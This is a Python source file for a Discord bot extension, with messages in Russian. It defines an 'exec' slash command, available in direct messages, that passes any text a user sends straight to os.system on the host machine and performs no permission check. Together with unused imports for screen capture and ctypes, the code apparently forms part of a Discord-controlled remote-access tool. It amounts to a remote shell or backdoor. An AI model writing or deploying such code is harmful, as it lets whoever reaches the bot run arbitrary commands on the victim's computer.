import ctypes
import sys

import discord
import disnake
from pymongo import MongoClient, errors
from disnake.ext import commands
from datetime import datetime
import os
import asyncio
import time
import mss
import mss.tools


class ExecCog(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.inter = disnake.ApplicationCommandInteraction

    @commands.slash_command(name='exec', dm_permission=True)
    async def exec(self, inter: disnake.ApplicationCommandInteraction, command: str):
        try:
            await inter.response.defer()
            code_exit = os.system(f'{command} RunAs')
            if code_exit == 0:
                await inter.edit_original_response(f'Команда: {command} выполнилась успешно!')
            else:
                await inter.send('Код не выполнен.')
        except Exception as e:
            await inter.send(f'Возникла ошибка! `{str(e)}`')


def setup(bot):
    bot.add_cog(ExecCog(bot))
    print("Exec Cog is ready!")
